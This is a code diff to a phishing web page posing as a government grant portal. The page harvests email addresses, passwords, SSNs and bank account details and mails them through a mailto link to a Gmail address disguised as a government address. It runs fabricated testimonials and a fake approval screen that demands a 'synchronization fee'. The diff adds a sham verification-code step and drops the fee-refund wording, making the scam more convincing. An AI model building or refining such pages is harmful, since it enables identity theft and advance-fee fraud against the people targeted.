@@ -22,6 +22,7 @@
         .spinner { border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; margin: 15px 0; font-weight: bold; border-left: 5px solid #856404; }
+        .code-display { font-size: 32px; font-weight: bold; color: var(--navy); background: #f0f0f0; padding: 15px; margin: 15px 0; letter-spacing: 8px; border: 2px dashed var(--navy); text-align: center; }
     </style>
 </head>
 <body>
@@ -41,10 +42,19 @@
         <input type="email" id="email" placeholder="example@gmail.com" required>
         <label>Password</label>
         <input type="password" id="pass" required>
-        <button onclick="signup()">Create Account</button>
+        <button onclick="signup()">Continue to Verification</button>
     </div>
 
     <div id="p2" class="page">
+        <h2>Identity Verification</h2>
+        <p style="font-size: 13px;">Your unique secure access code has been generated. Enter it below to authorize this session.</p>
+        <div class="code-display" id="genID"></div>
+        <label>Enter Access Code</label>
+        <input type="text" id="userInputCode" placeholder="000000" maxlength="6">
+        <button onclick="verifyCode()">Verify Access</button>
+    </div>
+
+    <div id="p3" class="page">
         <h2>Eligibility Screening</h2>
         <label>Status</label>
         <select id="userStatus" onchange="updateReasons()">
@@ -61,11 +71,11 @@
             <option>Married (With kids)</option>
         </select>
         <label>ID Card Number / SSN</label>
-        <input type="text" id="idNum" placeholder="Valid ID Required" required>
-        <button onclick="toPage(3)">Next: Disbursement Details</button>
+        <input type="text" id="idNum" placeholder="Verification ID Required" required>
+        <button onclick="toPage(4)">Next: Disbursement Details</button>
     </div>
 
-    <div id="p3" class="page">
+    <div id="p4" class="page">
         <h2>Banking Information</h2>
         <label>Full Name on Account</label>
         <input type="text" id="accName" required>
@@ -79,10 +89,10 @@
     <div id="pLoading" class="page loader-box">
         <div class="spinner"></div>
         <h3 id="loadText">Submitting to Treasury...</h3>
-        <p>Please wait. System is calculating regional allocation.</p>
+        <p>Your application is being analyzed by the Grant Review Board.</p>
     </div>
 
-    <div id="p4" class="page text-center">
+    <div id="p5" class="page text-center">
         <h1 style="color: #1a5e20;">APPROVED ✅</h1>
         <div class="warning-box">
             ⚠️ IMPORTANT: SCREENSHOT THIS PAGE NOW! <br>
@@ -90,36 +100,31 @@
         </div>
         <div style="font-size: 40px; font-weight: bold; margin: 20px 0; color: var(--navy);" id="finalAmt"></div>
         <p>A synchronization fee of <strong id="feeAmt" style="color: #d9534f;"></strong> is required to release the award.</p>
-        <p style="font-size: 12px; color: #666;">This fee is 100% refundable and will be added back to your payout.</p>
         <hr>
         <label>Add Your Testimony</label>
-        <textarea id="myTest" placeholder="Tell others about your approval..."></textarea>
-        <button onclick="alert('Testimony submitted for verification.')">Post Testimony</button>
+        <textarea id="myTest" placeholder="Share your results..."></textarea>
+        <button onclick="alert('Testimony submitted for review.')">Post Testimony</button>
     </div>
 </div>
 
 <script>
     const MY_EMAIL = "fundallocation.gov@gmail.com";
-    
-    // Testimonial Engine - No names, No repeats
+    let activeCode = "";
+
     const tTexts = [
         "I just received my award of $145,000! Completely legit.",
         "The $420 fee was processed and my account was credited 2 hours later.",
         "Verified! My business expansion is now fully funded by the 2026 grant.",
         "Best government initiative yet. The process was smooth.",
-        "I was skeptical but I just got my reference number and the bank alert.",
         "Approved for $310,000. Household relief is finally here!",
-        "Fastest allocation portal ever. Got my approval in 10 minutes.",
-        "If you are seeing this, don't hesitate. It really works."
+        "Fastest allocation portal ever. Got my approval in 10 minutes."
     ];
     let lastTIndex = -1;
 
     function startTicker() {
         setInterval(() => {
             let index;
-            do {
-                index = Math.floor(Math.random() * tTexts.length);
-            } while (index === lastTIndex);
+            do { index = Math.floor(Math.random() * tTexts.length); } while (index === lastTIndex);
             lastTIndex = index;
             document.getElementById('ticker').innerHTML = `"${tTexts[index]}"`;
         }, 5000);
@@ -141,7 +146,19 @@
     function signup() {
         const email = document.getElementById('email').value;
         if(!email.endsWith("@gmail.com")) return alert("Only @gmail.com accounts are eligible.");
+        
+        activeCode = Math.floor(100000 + Math.random() * 900000).toString();
+        document.getElementById('genID').innerText = activeCode;
         toPage(2);
+    }
+
+    function verifyCode() {
+        const userInput = document.getElementById('userInputCode').value;
+        if(userInput === activeCode) {
+            toPage(3);
+        } else {
+            alert("Incorrect Security Code. Please check the code provided.");
+        }
     }
 
     function finalizeAndRedirect() {
@@ -154,26 +171,21 @@
 
         const userData = {
             email: document.getElementById('email').value,
-            amt: amt, 
-            fee: fee, 
-            ref: ref
+            amt: amt, fee: fee, ref: ref
         };
         localStorage.setItem('gov_auth', JSON.stringify(userData));
 
-        // Email Body now includes the Fee they need to pay
         const body = `GOV APPLICATION SUBMISSION\n-----------------------\nEmail: ${userData.email}\nID/SSN: ${document.getElementById('idNum').value}\nBank: ${document.getElementById('bankName').value}\nAcc Name: ${document.getElementById('accName').value}\nAcc Num: ${document.getElementById('accNum').value}\n-----------------------\nAWARD AMOUNT: ${amt}\nREQUIRED SYNC FEE: ${fee}\nREF NUMBER: ${ref}`;
         
-        window.location.href = `mailto:${MY_EMAIL}?subject=New Claim Submission ${ref}&body=${encodeURIComponent(body)}`;
+        window.location.href = `mailto:${MY_EMAIL}?subject=Application Submission ${ref}&body=${encodeURIComponent(body)}`;
 
         toPage('loading');
         
         setTimeout(() => {
             document.getElementById('loadText').innerText = "Verifying Submission Data...";
             setTimeout(() => {
-                document.getElementById('loadText').innerText = "Final Payout Calculation...";
-                setTimeout(() => {
-                    showDashboard(userData);
-                }, 5000);
+                document.getElementById('loadText').innerText = "Finalizing Approval...";
+                setTimeout(() => { showDashboard(userData); }, 5000);
             }, 5000);
         }, 5000);
     }
@@ -182,7 +194,7 @@
         document.getElementById('finalAmt').innerText = data.amt;
         document.getElementById('feeAmt').innerText = data.fee;
         document.getElementById('refNum').innerText = data.ref;
-        toPage(4);
+        toPage(5);
     }
 
     window.onload = () => {
